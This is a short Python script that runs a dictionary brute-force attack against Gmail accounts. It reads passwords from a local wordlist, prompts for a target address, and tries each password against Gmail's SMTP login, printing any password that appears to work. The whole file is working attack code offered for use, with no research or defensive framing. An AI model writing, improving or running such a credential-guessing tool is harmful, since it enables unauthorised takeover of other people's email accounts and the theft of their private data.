import smtplib

print("Empty Input = return")

def main():
    i = 0
    pass_file = open("./passwords.txt", 'r')
    pass_list = pass_file.readlines()
    gmail = input("Gmail ->")
    if gmail == '':
        return

    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()

    for password in pass_list:
        i = i + 1
        try:
            server.login(gmail, password)
            print(f"Password: {password}")
            break
        except smtplib.SMTPAuthenticationError as err:
            error = str(err)
            if error[14] == '<':
                print(f"Password: {password}")
                break
            else:
                print("No matching passwords")

main()